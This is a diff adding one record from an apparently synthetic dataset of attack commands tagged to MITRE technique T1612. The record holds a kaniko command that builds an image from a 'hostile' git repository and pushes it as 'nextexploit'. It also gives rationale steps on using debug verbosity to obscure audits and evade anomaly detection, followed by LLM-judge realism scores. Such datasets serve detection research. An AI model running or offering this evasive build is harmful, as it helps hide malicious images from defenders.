@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1612",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "kaniko --verbosity debug --context git://hostile/repo.git -f Dockerfile -d nexthost/nextexploit",
+  "explanation": "This command increases the verbosity to debug mode in kaniko while pulling a context from a potentially hostile Git repository, which aids in masking the malicious intent during the build process.",
+  "rationale_steps": [
+    "Utilize high verbosity to obscure the audit and complicate anomaly detection during a risky build.",
+    "Fetch a potentially compromised repository and proceed to a carefully tagged deployment."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1612-aba9f22d-b9bb5c41",
+  "source_prompt_hash": "aba9f22d",
+  "timestamp_utc": "2025-07-10T23:23:42.176093Z",
+  "validation": {
+    "syntax_ok": {
+      "pass": true,
+      "forbidden_tokens": false,
+      "obfuscation_suspicious": false,
+      "obfuscation_entropy": 4.37,
+      "command_length": 95
+    },
+    "llm_judgments": [
+      {
+        "model": "gpt-4-turbo",
+        "score": 0.84,
+        "category_fit": 0.9,
+        "attack_realism": 0.85,
+        "maliciousness": 0.8,
+        "technical_plausibility": 0.9,
+        "privilege_relevance": 0.6,
+        "reason": "The sample closely matches T1612's description, as it involves building a container image on the host potentially with malicious intent, is realistic and technically possible on Linux without requiring elevated privileges.",
+        "timestamp": "2025-07-12T18:33:45.093705Z"
+      },
+      {
+        "model": "claude-3-opus-20240229",
+        "category_fit": 1.0,
+        "attack_realism": 0.9,
+        "maliciousness": 0.8,
+        "technical_plausibility": 1.0,
+        "privilege_relevance": 0.9,
+        "score": 0.93,
+        "reason": "The command demonstrates a realistic container image build using kaniko with a malicious Git repository, perfectly matching T1612's description of building custom images to embed malware.",
+        "timestamp": "2025-07-14T04:32:46.150603Z"
+      }
+    ],
+    "llm_average_submetrics": {
+      "category_fit": 0.95,
+      "attack_realism": 0.875,
+      "maliciousness": 0.8,
+      "technical_plausibility": 0.95,
+      "privilege_relevance": 0.75
+    },
+    "llm_average_score": 0.885,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
